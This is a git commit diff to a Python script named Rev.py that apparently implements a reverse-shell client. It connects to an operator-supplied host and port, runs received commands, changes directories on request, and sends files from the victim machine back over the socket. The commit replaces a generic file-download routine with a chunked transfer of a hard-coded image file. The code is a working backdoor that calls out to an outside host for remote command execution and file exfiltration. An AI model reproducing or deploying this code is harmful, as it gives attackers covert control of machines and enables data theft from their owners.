7a86c7fb85b9237519787a5d0849702de9cdbe9d
cl3tu5 <53231555+CletusG@users.noreply.github.com>
2020-09-08 07:05:58 -0400

    Code backup/download update

--- Linux/Rev.py
+++ Linux/Rev.py
@@ -1,13 +1,16 @@
 import os
 import socket
 import subprocess
+import tqdm
 
 s = socket.socket()
 host = input(("Host: "))
 port = int(input("Port: "))
 s.connect((host, port))
 
-BYTES = 10000
+SEPARATOR = "<SEPARATOR>"
+
+BYTES = 1000000
 
 while True:
 	data = s.recv(BYTES)
@@ -16,12 +19,31 @@ while True:
 	if data[:2].decode("utf-8") == "cd":
 		os.chdir(data[3:].decode("utf-8"))
 	elif data.decode("utf-8") == "download":
-		file_path = s.recv(BYTES)
+		"""file_path = s.recv(BYTES)
 		file_path = file_path.decode()
 		file = open(file_path, "rb")
 		contents = file.read()
 		s.send(contents)
-		print("File sent succesfully")
+		print("File sent succesfully")"""
+		filename = "alto-adventure.png"
+		filesize = os.path.getsize(filename)
+		s.send(f"{filename}{SEPARATOR}{filesize}".encode())
+		print("Name: " + filename)
+		print("Size: " + str(filesize))
+		# start sending the file
+		progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+		with open(filename, "rb") as f:
+		    for _ in progress:
+		        # read the bytes from the file
+		        bytes_read = f.read(BYTES)
+		        if not bytes_read:
+		            # file transmitting is done
+		            break
+		        # we use sendall to assure transimission in 
+		        # busy networks
+		        s.sendall(bytes_read)
+		        # update the progress bar
+		        progress.update(len(bytes_read))
 
 	# this must not be elif so it gets executed and actually sends the output stuff
 	if len(data) > 0:
